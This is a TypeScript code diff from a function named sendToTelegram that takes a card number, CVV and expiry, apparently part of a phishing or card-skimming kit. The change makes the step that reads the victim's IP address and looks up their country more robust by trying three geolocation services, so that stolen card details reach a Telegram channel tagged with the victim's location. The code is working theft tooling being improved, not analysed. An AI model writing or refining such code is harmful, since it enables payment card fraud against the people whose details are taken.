@@ -18,14 +18,38 @@ export async function sendToTelegram(data: { cardNumber: string; cvv: string; ex
     const ipAddress = forwardedFor ? forwardedFor.split(",")[0].trim() : headersList.get("x-real-ip") || "Unknown"
 
     let country = "Unknown"
-    try {
-      const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`)
-      if (geoResponse.ok) {
-        const geoData = await geoResponse.json()
-        country = geoData.country_name || "Unknown"
+    
+    // Try multiple geolocation services for redundancy
+    const geoServices = [
+      {
+        url: `https://ipapi.co/${ipAddress}/json/`,
+        parser: (data: any) => data.country_name,
+      },
+      {
+        url: `https://ip-api.com/json/${ipAddress}`,
+        parser: (data: any) => data.country,
+      },
+      {
+        url: `https://ipwho.is/${ipAddress}`,
+        parser: (data: any) => data.country,
+      },
+    ]
+
+    for (const service of geoServices) {
+      try {
+        const geoResponse = await fetch(service.url, { signal: AbortSignal.timeout(5000) })
+        if (geoResponse.ok) {
+          const geoData = await geoResponse.json()
+          const countryName = service.parser(geoData)
+          if (countryName) {
+            country = countryName
+            break
+          }
+        }
+      } catch (geoError) {
+        console.error(`Error fetching geolocation from ${service.url}:`, geoError)
+        continue
       }
-    } catch (geoError) {
-      console.error("Error fetching geolocation:", geoError)
     }
 
     const message = `
